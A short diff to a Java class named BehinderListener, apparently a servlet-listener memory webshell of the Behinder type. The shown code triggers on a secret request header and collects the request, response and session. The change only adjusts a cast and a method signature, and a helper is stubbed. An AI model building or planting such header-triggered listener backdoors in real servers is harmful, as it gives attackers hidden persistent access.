@@ -82,7 +82,7 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
         try {
             if (request.getHeader(headerName) != null
                     && request.getHeader(headerName).contains(headerValue)) {
-                HttpServletResponse response = this.getResponseFromRequest(request);
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                 HttpSession session = ((HttpServletRequest) request).getSession();
                 Map<String, Object> obj = new HashMap<String, Object>(3);
                 obj.put("request", request);
@@ -109,7 +109,7 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
         }
     }
 
-    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
+    private Object getResponseFromRequest(Object request) throws Exception {
         return null;
     }
 }
